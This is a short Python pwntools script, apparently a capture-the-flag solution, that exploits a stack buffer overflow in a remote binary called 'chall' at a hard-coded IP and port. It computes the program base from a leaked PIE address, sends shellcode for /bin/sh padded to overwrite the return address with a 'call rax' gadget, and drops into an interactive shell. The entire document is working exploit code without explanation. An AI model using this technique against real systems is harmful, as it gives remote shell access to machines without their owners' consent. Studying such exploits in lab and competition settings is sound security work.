from pwn import *

elf = context.binary = ELF('./chall')

# p = process()
p = remote("103.185.44.122", 15118)

p.sendlineafter(b">> ",b'1')
pie = int(p.recvuntil(b'x')[:-1].decode())
print(hex(pie))
base = pie-0x1fd00
print(hex(base))
CALL_RAX = base + 0x0000000000001014

payload = asm(shellcraft.sh())        # front of buffer <- RAX points here
payload = payload.ljust(120, b'A')    # pad until RIP
payload += p64(CALL_RAX)     

p.sendline(payload)
p.interactive()